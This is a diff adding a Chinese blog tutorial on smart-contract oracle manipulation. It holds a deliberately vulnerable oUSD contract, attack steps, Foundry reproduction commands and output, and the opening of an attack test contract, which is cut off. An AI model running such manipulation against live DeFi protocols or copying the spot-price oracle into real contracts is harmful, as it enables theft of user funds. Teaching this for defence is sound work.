@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>合约安全：操纵预言机 - 专注于区块链智能合约开发和审计 | 5oneXj′s Blog</title><meta name="Description" content="专注于区块链智能合约开发和审计 | 5oneXj′s Blog"><meta property="og:title" content="合约安全：操纵预言机" />
+<meta property="og:description" content="引言 操纵预言机攻击，并复现了一个攻击示例：用1 ETH兑换17万亿枚稳定币。仅2022年一年，操纵预言机攻击造成用户资产损失超过 2 亿美元。 1 价" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.webhooks.top/posts/solidity-smart-contract-security-oracle-manipulation.html" /><meta property="og:image" content="https://blog.webhooks.top/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-12-22T11:12:14+08:00" />
+<meta property="article:modified_time" content="2022-12-22T11:12:14+08:00" /><meta property="og:site_name" content="5oneXj′s Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://blog.webhooks.top/logo.png"/>
+
+<meta name="twitter:title" content="合约安全：操纵预言机"/>
+<meta name="twitter:description" content="引言 操纵预言机攻击，并复现了一个攻击示例：用1 ETH兑换17万亿枚稳定币。仅2022年一年，操纵预言机攻击造成用户资产损失超过 2 亿美元。 1 价"/>
+<meta name="application-name" content="5oneXj′s Blog">
+<meta name="apple-mobile-web-app-title" content="5oneXj′s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.webhooks.top/posts/solidity-smart-contract-security-oracle-manipulation.html" /><link rel="prev" href="https://blog.webhooks.top/posts/blockchain-technology-interview-question-and-answer.html" /><link rel="next" href="https://blog.webhooks.top/posts/16-safety-recommendations.html" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "合约安全：操纵预言机",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.webhooks.top\/posts\/solidity-smart-contract-security-oracle-manipulation.html"
+        },"image": ["https:\/\/blog.webhooks.top\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "solidity, security, oracle","wordcount":  2281 ,
+        "url": "https:\/\/blog.webhooks.top\/posts\/solidity-smart-contract-security-oracle-manipulation.html","datePublished": "2022-12-22T11:12:14+08:00","dateModified": "2022-12-22T11:12:14+08:00","publisher": {
+            "@type": "Organization",
+            "name": "5oneXj","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/blog.webhooks.top\/images\/avatar.png",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "5oneXj"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="专注于区块链智能合约开发和审计 | 5oneXj′s Blog"><span class="header-title-pre"><i class='fa fa-duotone fa-code' style='color: #074f6a;margin-right:12px;'></i></span><span id="id-1" class="typeit"></span><span class="header-title-post"><x style='color: #8f5656;'> Blog</x></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts.html" title="所有文章"> Posts </a><a class="menu-item" href="/tags.html" title="所有标签"> Tags </a><a class="menu-item" href="/categories.html" title="所有分类"> Categories </a><a class="menu-item" href="/about.html" title="关于"> About </a><a class="menu-item" href="https://github.com/jollysone" title="GitHub" rel="noopener noreffer" target="_blank">  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="专注于区块链智能合约开发和审计 | 5oneXj′s Blog"><span class="header-title-pre"><i class='fa fa-duotone fa-code' style='color: #074f6a;margin-right:12px;'></i></span><span id="id-2" class="typeit"></span><span class="header-title-post"><x style='color: #8f5656;'> Blog</x></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts.html" title="所有文章">Posts</a><a class="menu-item" href="/tags.html" title="所有标签">Tags</a><a class="menu-item" href="/categories.html" title="所有分类">Categories</a><a class="menu-item" href="/about.html" title="关于">About</a><a class="menu-item" href="https://github.com/jollysone" title="GitHub" rel="noopener noreffer" target="_blank"></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">合约安全：操纵预言机</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>5oneXj</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8.html"><i class="far fa-folder fa-fw" aria-hidden="true"></i>合约安全</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-12-22">2022-12-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 2281 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 5 分钟&nbsp;<span id="/posts/solidity-smart-contract-security-oracle-manipulation.html" class="leancloud_visitors" data-flag-title="合约安全：操纵预言机">
+                        <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#1-价格预言机">1 价格预言机</a></li>
+        <li><a href="#2-预言机漏洞">2 预言机漏洞</a>
+          <ul>
+            <li><a href="#21-漏洞例子">2.1 漏洞例子</a></li>
+            <li><a href="#22-漏洞合约">2.2 漏洞合约</a></li>
+            <li><a href="#23-攻击思路">2.3 攻击思路</a></li>
+            <li><a href="#24-foundry-复现">2.4 Foundry 复现</a></li>
+          </ul>
+        </li>
+        <li><a href="#3-预防方法">3 预防方法</a></li>
+        <li><a href="#4-总结">4 总结</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>引言<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">操纵预言机攻击，并复现了一个攻击示例：用<code>1 ETH</code>兑换17万亿枚稳定币。仅2022年一年，操纵预言机攻击造成用户资产损失超过 2 亿美元。</div>
+        </div>
+    </div>
+<h2 id="1-价格预言机">1 价格预言机</h2>
+<p>出于安全性的考虑，以太坊虚拟机（EVM）是一个封闭孤立的沙盒。在EVM上运行的智能合约可以接触链上信息，但无法主动和外界沟通获取链下信息。但是，这类信息对去中心化应用非常重要。</p>
+<p>预言机（oracle）可以帮助我们解决这个问题，它从链下数据源获得信息，并将其添加到链上，供智能合约使用。</p>
+<p>其中最常用的就是价格预言机（price oracle），它可以指代任何可以让你查询币价的数据源。典型用例：</p>
+<ul>
+<li>去中心借贷平台（AAVE）使用它来确定借款人是否已达到清算阈值。</li>
+<li>合成资产平台（Synthetix）使用它来确定资产最新价格，并支持 0 滑点交易。</li>
+<li>MakerDAO使用它来确定抵押品的价格，并铸造相应的稳定币 $DAI。</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/jollysone/Picture-Library/master/blog/202302252307550.png"
+        data-srcset="https://raw.githubusercontent.com/jollysone/Picture-Library/master/blog/202302252307550.png, https://raw.githubusercontent.com/jollysone/Picture-Library/master/blog/202302252307550.png 1.5x, https://raw.githubusercontent.com/jollysone/Picture-Library/master/blog/202302252307550.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/jollysone/Picture-Library/master/blog/202302252307550.png"
+        title="https://raw.githubusercontent.com/jollysone/Picture-Library/master/blog/202302252307550.png" /></p>
+<h2 id="2-预言机漏洞">2 预言机漏洞</h2>
+<p>如果预言机没有被开发者正确使用，会造成很大的安全隐患。</p>
+<ul>
+<li>2021年10月，BNB链上的DeFi平台Cream Finance因为预言机漏洞<a href="https://rekt.news/cream-rekt-2/" target="_blank" rel="noopener noreffer ">被盗用户资金 1.3亿 美元</a>。</li>
+<li>2022年5月，Terra链上的合成资产平台Mirror Protocol因为预言机漏洞<a href="https://rekt.news/mirror-rekt/" target="_blank" rel="noopener noreffer ">被盗用户资金 1.15亿 美元</a>。</li>
+<li>2022年10月，Solana链上的去中心化借贷平台Mango Market因为预言机漏洞<a href="https://rekt.news/mango-markets-rekt/" target="_blank" rel="noopener noreffer ">被盗用户资金 1.15亿 美元</a>。</li>
+</ul>
+<h3 id="21-漏洞例子">2.1 漏洞例子</h3>
+<p>下面我们学习一个预言机漏洞的例子，<code>oUSD</code> 合约。该合约是一个稳定币合约，符合ERC20标准。类似合成资产平台Synthetix，用户可以在这个合约中零滑点的将 <code>ETH</code> 兑换为 <code>oUSD</code>（Oracle USD）。兑换价格由自定义的价格预言机（<code>getPrice()</code>函数）决定，这里采取的是Uniswap V2的 <code>WETH-BUSD</code> 的瞬时价格。在之后的攻击示例例子中，我们会看到这个预言机非常容易被操纵。</p>
+<h3 id="22-漏洞合约">2.2 漏洞合约</h3>
+<p><code>oUSD</code>合约包含<code>7</code>个状态变量，用来记录<code>BUSD</code>，<code>WETH</code>，<code>UniswapV2</code>工厂合约，和<code>WETH-BUSD</code>币对合约的地址。</p>
+<p><code>oUSD</code>合约主要包含<code>3</code>个函数:</p>
+<ul>
+<li>构造函数: 初始化 <code>ERC20</code> 代币的名称和代号。</li>
+<li><code>getPrice()</code>：价格预言机，获取Uniswap V2的 <code>WETH-BUSD</code> 的瞬时价格，这也是漏洞所在。
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  // 获取ETH price
+</span></span><span class="line"><span class="cl">  function getPrice() public view returns (uint256 price) {
+</span></span><span class="line"><span class="cl">      // pair 交易对中储备
+</span></span><span class="line"><span class="cl">      (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
+</span></span><span class="line"><span class="cl">      // ETH 瞬时价格
+</span></span><span class="line"><span class="cl">      price = reserve0/reserve1;
+</span></span><span class="line"><span class="cl">  }
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li><code>swap()</code>：兑换函数，将 <code>ETH</code> 以预言机给定的价格兑换为 <code>oUSD</code>。</li>
+</ul>
+<p>合约代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">oUSD</span> <span class="k">is</span> <span class="n">ERC20</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 主网合约
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">address</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">FACTORY_V2</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">WETH</span> <span class="o">=</span> <span class="mh">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">BUSD</span> <span class="o">=</span> <span class="mh">0x4Fabb145d64652a948d72533023f6E7A623C7C53</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">IUniswapV2Factory</span> <span class="k">public</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">IUniswapV2Factory</span><span class="p">(</span><span class="n">FACTORY_V2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IUniswapV2Pair</span> <span class="k">public</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">factory</span><span class="p">.</span><span class="n">getPair</span><span class="p">(</span><span class="n">WETH</span><span class="p">,</span> <span class="n">BUSD</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IERC20</span> <span class="k">public</span> <span class="n">weth</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IERC20</span> <span class="k">public</span> <span class="n">busd</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">BUSD</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="n">ERC20</span><span class="p">(</span><span class="s">&#34;Oracle USD&#34;</span><span class="p">,</span><span class="s">&#34;oUSD&#34;</span><span class="p">){}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 获取ETH price
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">getPrice</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">price</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// pair 交易对中储备
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">(</span><span class="kt">uint112</span> <span class="n">reserve0</span><span class="p">,</span> <span class="kt">uint112</span> <span class="n">reserve1</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">pair</span><span class="p">.</span><span class="n">getReserves</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// ETH 瞬时价格
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">price</span> <span class="o">=</span> <span class="n">reserve0</span><span class="o">/</span><span class="n">reserve1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">swap</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 获取价格
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint</span> <span class="n">price</span> <span class="o">=</span> <span class="n">getPrice</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 计算兑换数量
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">amount</span> <span class="o">=</span> <span class="n">price</span> <span class="o">*</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 铸造代币
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">_mint</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="23-攻击思路">2.3 攻击思路</h3>
+<p>我们针对有漏洞的价格预言机 <code>getPrice()</code> 函数进行攻击，步骤：</p>
+<ol>
+<li>准备一些 <code>BUSD</code>，可以是自有资金，也可以是闪电贷借款。在实现中，我们利用 Foundry 的 <code>deal</code> cheatcode 在本地网络上给自己铸造了 <code>1_000_000 BUSD</code></li>
+<li>在 UniswapV2 的 <code>WETH-BUSD</code> 池中大量买入 <code>WETH</code>。具体实现见攻击代码的 <code>swapBUSDtoWETH()</code> 函数。</li>
+<li><code>WETH</code> 瞬时价格暴涨，这时我们调用 <code>swap()</code> 函数将 <code>ETH</code> 转换为 <code>oUSD</code>。</li>
+<li><strong>可选:</strong> 在 UniswapV2 的 <code>WETH-BUSD</code> 池中卖出第2步买入的 <code>WETH</code>，收回本金。</li>
+</ol>
+<p>这4步可以在一个交易中完成。</p>
+<h3 id="24-foundry-复现">2.4 Foundry 复现</h3>
+<p>我们选用 Foundry 进行操纵预言机攻击的复现，因为它很快，并且可以创建主网的本地分叉，方便测试。</p>
+<ol>
+<li>在安装好 Foundry 之后，在命令行输入下列命令启动新项目，并安装 openzeppelin 库。</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">forge init Oracle
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> Oracle
+</span></span><span class="line"><span class="cl">forge install Openzeppelin/openzeppelin-contracts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>在根目录下创建 <code>.env</code> 环境变量文件，并在其中添加主网rpc，用于创建本地测试网。</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MAINNET_RPC_URL= https://rpc.ankr.com/eth
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>将这一讲的代码，<code>Oracle.sol</code> 和 <code>Oracle.t.sol</code>，分别复制到根目录的 <code>src</code> 和 <code>test</code> 文件夹下，然后使用下列命令启动攻击脚本。</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">forge test -vv --match-test testOracleAttack
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li>我们可以在终端中看到攻击结果。在攻击前，预言机 <code>getPrice()</code> 给出的 <code>ETH</code>
+价格为 <code>1216 USD</code>，是正常的。但在我们使用 <code>1,000,000</code> BUSD 在 UniswapV2 的 <code>WETH-BUSD</code> 池子中买入 <code>WETH</code> 之后，预言机给出的价格被操纵为 <code>17,979,841,782,699 USD</code>。这时，我们可以轻松的用 <code>1 ETH</code> 兑换17万亿枚 <code>oUSD</code>，完成攻击。</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Running <span class="m">1</span> <span class="nb">test</span> <span class="k">for</span> test/Oracle.t.sol:OracleTest
+</span></span><span class="line"><span class="cl"><span class="o">[</span>PASS<span class="o">]</span> testOracleAttack<span class="o">()</span> <span class="o">(</span>gas: 356524<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logs:
+</span></span><span class="line"><span class="cl">  1. ETH Price <span class="o">(</span>before attack<span class="o">)</span>: <span class="m">1216</span>
+</span></span><span class="line"><span class="cl">  2. Swap 1,000,000 BUSD to WETH to manipulate the oracle
+</span></span><span class="line"><span class="cl">  3. ETH price <span class="o">(</span>after attack<span class="o">)</span>: <span class="m">17979841782699</span>
+</span></span><span class="line"><span class="cl">  4. Minted <span class="m">1797984178269</span> oUSD with <span class="m">1</span> ETH <span class="o">(</span>after attack<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Test result: ok. <span class="m">1</span> passed<span class="p">;</span> <span class="m">0</span> failed<span class="p">;</span> finished in 262.94ms
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>攻击代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/Test.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/console.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;../src/Oracle.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">OracleTest</span> <span class="k">is</span> <span class="n">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">private</span> <span class="k">constant</span> <span class="n">alice</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">private</span> <span class="k">constant</span> <span class="n">WETH</span> <span class="o">=</span> <span class="mh">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">private</span> <span class="k">constant</span> <span class="n">BUSD</span> <span class="o">=</span> <span class="mh">0x4Fabb145d64652a948d72533023f6E7A623C7C53</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">private</span> <span class="k">constant</span> <span class="n">ROUTER</span> <span class="o">=</span> <span class="mh">0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IUniswapV2Router</span> <span class="n">router</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IWETH</span> <span class="k">private</span> <span class="n">weth</span> <span class="o">=</span> <span class="n">IWETH</span><span class="p">(</span><span class="n">WETH</span><span class="p">);</span>
